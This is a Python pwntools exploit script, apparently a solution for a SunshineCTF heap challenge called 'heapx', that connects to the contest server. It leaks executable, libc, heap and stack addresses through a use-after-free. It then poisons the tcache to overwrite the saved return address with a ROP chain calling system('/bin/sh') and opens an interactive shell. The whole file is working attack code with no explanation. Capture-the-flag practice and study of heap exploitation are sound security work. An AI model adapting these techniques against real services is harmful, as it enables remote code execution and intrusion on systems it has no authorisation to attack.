#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapx_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

#brva 0x1660
#brva 0x15B9
#brva 0x140A
#brva 0x1575

if args.LOCAL:
    p = process([exe.path], aslr=False)
else:
    p = remote("chal.sunshinectf.games", 25004)

def new(size):
    p.sendlineafter(b'> ', b'new ' + size)

def write(idx, idx_write, payload):
    p.sendlineafter(b'> ', b'write ' + idx + b' ' + idx_write)
    p.sendafter(b'data: ', payload)

def delete(idx):
    p.sendlineafter(b'> ', b'delete ' + idx)

def show(idx):
    p.sendlineafter(b'> ', b'read ' + idx)


# leak libc
# input()

# leak exe
p.sendlineafter(b'> ', b'write ' + b'0' + b' ' + b'0')
p.recvuntil(b'#')
exe_leak = int(p.recv(14), 16)
exe.address = exe_leak - 0x4060
log.info("exe base: " + hex(exe.address))

new(b'1072') #0
new(b'48') #1

delete(b'0')
show(b'0')

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x210b20
log.info("lib leak: " + hex(libc_leak))
log.info("lib base: " + hex(libc.address))

pop_rdi = 0x119e9c + libc.address
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))
ret = pop_rdi + 1

# leak heap
new(b'48') #2
new(b'48') #3

delete(b'2')
delete(b'3')

show(b'2')
heap_leak = u64(p.recv(5) + b'\0\0\0')
heap_base = heap_leak << 12
log.info("heap leak: " + hex(heap_leak))
log.info("heap base: " + hex(heap_base))
target = (libc.sym.environ - 0x18) ^ ((heap_base + 0x2f0) >> 12)
write(b'3', b'0', p64(target))

new(b'48') #4
new(b'48') #5

write(b'5', b'0', b'a'*0x19)
show(b'5')
p.recvuntil(b'a'*0x18)
stack_leak = u64(p.recv(6) + b'\0\0')
log.info("stack leak: " + hex(stack_leak))
rip = stack_leak - 0x138

# tcache poisioning
new(b'48') #6
new(b'48') #7

delete(b'6')
delete(b'7')

payload = rip ^ ((heap_base + 0x370) >> 12)
write(b'7', b'0', p64(payload))

new(b'48') #8
new(b'48') #9

payload = p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

write(b'9', b'0', payload)

new(b'256') #10
new(b'256') #11

delete(b'10')
delete(b'11')
payload = exe_leak ^ ((heap_base + 0x430) >> 12)
write(b'11', b'0', p64(payload))

new(b'256') #12
new(b'256') #13

write(b'13', b'0', b'\0'*255 + b'\n')
p.sendlineafter(b'> ', b'exit')

p.interactive()